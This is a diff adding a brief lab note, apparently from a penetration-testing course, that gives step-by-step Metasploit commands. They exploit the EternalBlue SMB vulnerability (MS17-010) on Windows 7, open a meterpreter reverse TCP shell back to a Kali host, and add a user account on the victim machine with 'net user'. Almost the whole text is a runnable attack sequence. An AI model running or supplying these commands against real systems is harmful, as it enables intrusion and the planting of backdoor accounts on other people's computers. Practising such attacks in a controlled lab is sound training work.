@@ -1,0 +1,37 @@
+
+practicle 6:
+
+hacking windows xp/7 & create user. exploiting "smb port" vulnerbility on windows platform and createing user account on victim's machine
+
+
+
+msfconsole 
+
+search exploit/windows/smb
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+show payloads 
+
+set payload payload/windows/x64/meterpreter/reverse_tcp
+
+show targets
+
+show options
+
+set RHOST 10.10.10.3  -windows ip
+
+set LHOST 10.10.10.2  -kali ip
+
+set LPORT 5555
+
+exploit
+
+pwd
+
+shell
+
+net user abc 333 /ADD
+
+
+move to windows 7 restart 
